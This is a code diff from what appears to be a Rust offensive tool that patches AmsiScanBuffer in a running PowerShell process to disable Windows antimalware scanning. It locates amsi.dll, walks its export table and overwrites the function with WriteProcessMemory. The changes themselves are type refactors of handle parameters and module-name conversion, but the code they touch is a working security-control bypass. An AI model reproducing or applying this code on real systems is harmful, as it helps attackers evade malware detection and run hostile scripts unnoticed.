@@ -27,7 +27,7 @@ use syscalls::syscall;
 
 static PATH_REGEX: &str = r#"PS (?<ParentPath>(?:[a-zA-Z]\:|\\\\[\w\s\.\-]+\\[^\/\\<>:"|?\n\r]+)\\(?:[^\/\\<>:"|?\n\r]+\\)*)(?<BaseName>[^\/\\<>:"|?\n\r]*?)> "#;
 
-fn get_scan_buffer(amsiaddr: isize, phandle: isize, syscalls_value: bool) -> isize {
+fn get_scan_buffer(amsiaddr: isize, phandle: *mut c_void, syscalls_value: bool) -> isize {
     let mut status: NTSTATUS;
     let mut buf: [u8; 64] = [0; 64];
 
@@ -66,7 +66,7 @@ fn get_scan_buffer(amsiaddr: isize, phandle: isize, syscalls_value: bool) -> isi
         fill_structure_from_memory(
             &mut nt_head,
             (amsiaddr + dos_head.e_lfanew as isize) as *const c_void,
-            phandle as isize,
+            phandle,
             syscalls_value,
         );
         log::debug!(
@@ -80,7 +80,7 @@ fn get_scan_buffer(amsiaddr: isize, phandle: isize, syscalls_value: bool) -> isi
             &mut exports,
             (amsiaddr + nt_head.OptionalHeader.ExportTable.VirtualAddress as isize)
                 as *const c_void,
-            phandle as isize,
+            phandle,
             syscalls_value,
         );
         log::debug!("Exports: {:#x?}", exports);
@@ -116,7 +116,7 @@ fn get_scan_buffer(amsiaddr: isize, phandle: isize, syscalls_value: bool) -> isi
             let num = u32::from_ne_bytes(nameaddr.try_into().unwrap());
             let funcname = read_from_memory(
                 (amsiaddr + num as isize) as *const c_void,
-                phandle as isize,
+                phandle,
                 syscalls_value,
             );
             if funcname.trim_end_matches('\0') == "AmsiScanBuffer" {
@@ -242,7 +242,7 @@ pub fn patch_amsi(pid: u32, syscalls_value: bool) {
         let mut first_mod = MaybeUninit::<MODULEENTRY32>::uninit().assume_init();
         first_mod.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
         Module32First(snap_handle, &mut first_mod as *mut MODULEENTRY32);
-        let _modulname = string_from_array(&mut first_mod.szModule.to_vec());
+        let _modulname = string_from_array(&mut first_mod.szModule.to_vec().iter().map(|&x| x as u8).collect());
         log::debug!("Module name: {:?}", _modulname);
 
         // Search for the amsi.dll module in the PowerShell process memory
@@ -251,7 +251,7 @@ pub fn patch_amsi(pid: u32, syscalls_value: bool) {
             let mut next_mod = MaybeUninit::<MODULEENTRY32>::uninit().assume_init();
             next_mod.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
             let res_next = Module32Next(snap_handle, &mut next_mod as *mut MODULEENTRY32);
-            let next_module = string_from_array(&mut next_mod.szModule.to_vec());
+            let next_module = string_from_array(&mut next_mod.szModule.to_vec().iter().map(|&x| x as u8).collect());
             log::debug!("Next module: {:?}", next_module);
 
             if next_module == "amsi.dll" {
@@ -265,7 +265,7 @@ pub fn patch_amsi(pid: u32, syscalls_value: bool) {
 
         log::debug!("Amsi base addr: {:x?}", amsiaddr);
         let mut scanbuffer_addr =
-            get_scan_buffer(amsiaddr, new_handle as isize, syscalls_value) as *mut c_void;
+            get_scan_buffer(amsiaddr, new_handle, syscalls_value) as *mut c_void;
         log::debug!("AmsiScanBuffer base addr: {:x?}", scanbuffer_addr);
 
         // mov rax, 1
@@ -309,7 +309,7 @@ pub fn patch_amsi(pid: u32, syscalls_value: bool) {
             }
         } else {
             WriteProcessMemory(
-                new_handle as isize,
+                new_handle,
                 scanbuffer_addr,
                 patch.as_ptr() as *const c_void,
                 patch.len(),
@@ -317,7 +317,7 @@ pub fn patch_amsi(pid: u32, syscalls_value: bool) {
             );
         }
 
-        CloseHandle(new_handle as isize);
+        CloseHandle(new_handle);
     }
 }
 
